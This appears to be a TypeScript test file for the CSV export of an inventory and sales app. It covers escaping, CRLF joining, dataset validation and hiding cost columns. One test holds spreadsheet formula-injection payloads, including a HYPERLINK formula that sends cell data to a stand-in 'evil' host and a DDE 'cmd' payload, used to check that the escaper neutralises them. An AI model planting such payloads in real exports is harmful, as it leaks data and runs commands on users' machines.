import assert from "node:assert/strict";
import test from "node:test";
import { createInitialState } from "./store.ts";
import { buildExport, csvEscape, isExportDataset, toCsv } from "./export.ts";

test("csvEscape wraps values and doubles embedded quotes", () => {
  assert.equal(csvEscape("a"), '"a"');
  assert.equal(csvEscape('he said "hi"'), '"he said ""hi"""');
  assert.equal(csvEscape(undefined), '""');
  assert.equal(csvEscape(0), '"0"');
});

test("csvEscape neutralizes spreadsheet formula injection prefixes", () => {
  assert.equal(csvEscape('=HYPERLINK("http://evil/?"&A1)'), '"\'=HYPERLINK(""http://evil/?""&A1)"');
  assert.equal(csvEscape("+SUM(A1:A2)"), '"\'+SUM(A1:A2)"');
  assert.equal(csvEscape("-10+20"), '"\'-10+20"');
  assert.equal(csvEscape("@SUM(A1:A2)"), '"\'@SUM(A1:A2)"');
  assert.equal(csvEscape("\t=cmd|'/c calc'!A1"), '"\'\t=cmd|\'/c calc\'!A1"');
  assert.equal(csvEscape("\r=HYPERLINK(\"http://evil\")"), '"\'\r=HYPERLINK(""http://evil"")"');
});

test("toCsv joins header and rows with CRLF", () => {
  const csv = toCsv(["a", "b"], [[1, 2], ["x", "y"]]);
  assert.equal(csv, '"a","b"\r\n"1","2"\r\n"x","y"');
});

test("isExportDataset guards unknown datasets", () => {
  assert.equal(isExportDataset("inventory"), true);
  assert.equal(isExportDataset("nope"), false);
});

test("buildExport hides cost/profit columns when showCost is false", () => {
  const state = createInitialState();
  const withCost = buildExport(state, "inventory", { showCost: true });
  const withoutCost = buildExport(state, "inventory", { showCost: false });

  const headerOf = (csv: string) => csv.split("\r\n")[0];
  assert.ok(headerOf(withCost.csv).includes("成本价"));
  assert.ok(!headerOf(withoutCost.csv).includes("成本价"));
  // 隐藏成本时每行列数应一致减少
  const colCount = (line: string) => line.split('","').length;
  assert.ok(colCount(headerOf(withCost.csv)) > colCount(headerOf(withoutCost.csv)));
});

test("buildExport supports all datasets and rejects unknown", () => {
  const state = createInitialState();
  for (const dataset of ["inventory", "sales", "purchases", "ledger", "customers"]) {
    const out = buildExport(state, dataset, { showCost: true });
    assert.ok(out.filename.endsWith(".csv"));
    assert.ok(out.csv.length > 0);
  }
  assert.throws(() => buildExport(state, "unknown", { showCost: true }), /不支持的导出数据集/);
});
